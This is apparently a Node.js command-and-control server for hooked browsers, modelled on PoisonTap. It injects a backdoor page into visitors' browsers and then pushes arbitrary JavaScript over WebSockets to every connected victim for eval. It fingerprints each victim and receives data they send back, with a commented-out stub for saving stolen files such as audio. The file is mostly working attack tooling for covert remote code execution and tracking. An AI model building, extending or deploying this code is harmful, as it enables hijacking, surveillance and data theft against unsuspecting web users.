// CREDITS
// start of project based on PoisonTap by Samy Kamkar

//SERVER
//var _ = require('underscore')
var WebSocketServer = require('websocket').server
var webSocketsServerPort = 1337
var fs = require('fs');
var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html','utf8');
var http = require('http')
var conns = []
var gr;
var module;
var server = http.createServer((request, response) => {

  //output((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')

  if (request.url.indexOf('/exec?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF(JSON.stringify({ request: 'eval', content: request.url.substr(6) }))
    response.end("sent")
  }
  else if (request.url.indexOf('/send?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF('{"' + decodeURI(request.url.substr(6)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
    var checkgr = () =>
    {
      if (gr)
      {
        response.end(gr)
        gr = ""
      }
      else
        setTimeout(checkgr, 500)
    }
    checkgr()
  }
  else if (request.url === '/status')
  {
    response.writeHead(200, {'Content-Type': 'application/json'})
    var responseObject = {
      currentClients: 1234,
      totalHistory: 567
    }
    response.end(JSON.stringify(responseObject))
  }
  else {
	response.writeHead(200, {'Content-Type': 'text/html'});
	response.write('<script type="text/javascript">var host_addr="'+LHOST+'";var host_port="'+LPORT+'";</script>'+backdoorHtml);
	response.end();
    //response.writeHead(404, {'Content-Tddype': 'text/html'})
    //response.end('Sorry, unknown url')
  }
})
server.listen(webSocketsServerPort, () => {
  output((new Date()) + " Server is listening on port " + webSocketsServerPort )
  start_interface();
})

// create the server
wsServer = new WebSocketServer({
  httpServer: server
})
function handleresponse(obj, con)
{
	//HERE WHAT TO DO WITH RESPONSES FROM CLIENTS
	if ("fingerprint" in obj) {
		output("fingerprint: "+obj.fingerprint);
		con.fingerprint=obj.fingerprint;
	} else if ("data" in obj) {
		output(obj);
	}
	// TODO use for merging with connections for info // if ("components" in obj) {
	//TODO 
	//have modules be able to handle responses
	/*
	###handler all types of files (dataurls)
	function dataURItoBlob(dataURI) {
	    // convert base64/URLEncoded data component to raw binary data held in a string
	    var byteString;
	    if (dataURI.split(',')[0].indexOf('base64') >= 0)
		byteString = atob(dataURI.split(',')[1]);
	    else
		byteString = unescape(dataURI.split(',')[1]);

	    // separate out the mime component
	    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

	    // write the bytes of the string to a typed array
	    var ia = new Uint8Array(byteString.length);
	    for (var i = 0; i < byteString.length; i++) {
		ia[i] = byteString.charCodeAt(i);
	    }

	    return new Blob([ia], {type:mimeString});
	}

	var blob = dataURItoBlob(dataURL);
	var buf = new Buffer(blob); // decode
	//var buf = new Buffer(req.body.blob, 'base64'); // decode
	//TODO from mime out of blob.type -> make a detection system for extension of file (image with png, jpeg etc and audio, and video, also html
	//TODO save with time of receive and fingerprint
	  fs.writeFile("temp/test.wav", buf, function(err) {
	    if(err) {
	      console.log("err", err);
	    } else {
	      return res.json({'status': 'success'});
	    }
	  }); 
	  */
}
function handleReq(obj, con)
{
  if (obj.request === 'getresponse')
    gr = obj.html
}

function ask_fingerprint_info(connection)
{
	command = "new Fingerprint2().get(function(result, components){ socket.send(JSON.stringify({'fingerprint':result})); socket.send(JSON.stringify({'components':components})); });"
	connection.sendUTF(JSON.stringify({ request: 'eval', content: command }))  
}

//REQUESTS
wsServer.on('request', (request) => {
  var obj
  var connection = request.accept(null, request.origin)
  conns.push(connection)

  connection.on('request', (message) => {
    output('request: ' + message)
  })

  connection.on('message', (message) => {
    try { obj = JSON.parse(message.utf8Data) } catch(e) {}
    if (typeof(obj) === 'object')
	  {
		handleReq(obj, connection);
		handleresponse(obj,connection);

	  }
    else
	  {
		//TODO give name of connection (with using the connection var to the left
		output('message: ' + message.utf8Data);
	  }
  })
  // remove connection from our list
  connection.on('close', connection => {
    output('connection closed')
    for (var i in conns)
      if (conns[i] == connection)
        conns.splice(i, 1)
  })

  ask_fingerprint_info(connection);
})

//INTERFACE
var prompt = require('prompt');
var colors = require("colors/safe");
prompt.message = "";
prompt.delimiter = "";

function input() {
	//TODO check if already active
	//prompt.stop();
	prompt.start();
	prompt.get({properties: {command:{description: ">>>"}}}, function (err, result) {
		if (result != null) {
			process_command(result.command);
			input();
		} else {
			console.log("Exiting...");
			console.log();
			process.exit();
		}
	});
}
function output(text) {
	console.log("");
	console.log(text);
	//console.log("");
}
function start_interface() {
	console.log("Typed javascript-commands will be sent to all connected clients");
	input()
}

//OPTIONS
var LHOST = "localhost";
var LPORT = "1337";
var RHOST = "0.0.0.0";
var TARGETS = "all";

//PROCESSING OF COMMANDS
function process_command(command) {
	//different commands here -> make layer system
	first_argument=command.split(" ")[0];
	if (first_argument == "") {
	} else if (first_argument == "conns") {
		for (i in conns) {
			console.log(conns[i].fingerprint);
		}
	} else if (first_argument== "set") { 
		if (command.split(" ").length > 1) {
			assign=command.split(" ",2)[1].split("=");
			if (assign.length > 1){
				eval(assign[0].trim()+"='"+assign[1].trim()+"'");
			} else {
				console.log("No argument of form <variable>=<value>");
			}
		} else {
			console.log("not enough arguments")
		}
	} else if (first_argument== "options") { 
		if (typeof options === "function") { 
			options();
		}
	} else if (first_argument== "log") { 
		//on or off get data info
	} else if (first_argument== "load") { 
		//TODO detect tab for completion
		if (command.split(" ").length > 1) {
			module = require(__dirname+'/'+command.split(" ")[1]);
		} else {
			console.log("Not enough arguments")
		}
	} else if (first_argument== "unload") { 
		unload();
	} else if (first_argument== "exec") { 
		if (typeof module.data.exec === "function") { 
			//TODO VICTIMS -> naar victims (list
			victims = conns;
			if (command.split(" ").length > 1) {
				module.data.exec(victims, command.split(" ")[1]);
			} else {
				module.data.exec(victims);
			}
		} else {
			console.log('No exec function present in current module')
		}
	} else if (first_argument== "info") { 
		if (typeof module.data.info === "function") { 
			if (command.split(" ").length > 2) {
				module.data.info(command.split(" ")[1]);
			} else {
				module.data.info();
			}
		} else {
			console.log('No info function present in current module')
		}
	} else if (first_argument== "custom") { 
		if (TARGETS == "all") {
			inject_string = command.split(" ",2)[1];
			console.log("Command sent: "+inject_string);
			for (var i in conns)
				conns[i].sendUTF(JSON.stringify({ request: 'eval', content: inject_string }))
		} else {
			console.log("targets function TODO");
		}
	} else if (first_argument== "exit") { 
		process.exit();
	} else {
		command_not_found(command);
		help();
	}
}

//UNLOAD current module
function unload() {
}
//LIST OF SET OPTIONS
function options() {
} 
//HELP function to be called to have all basic commands listed
function help(){
	console.log("HELP");
}
//ERROR handling for command related stuff
function command_not_found(command){
	console.log("'"+command+"' is not a valid command, type 'help' for the full list of commands");
}

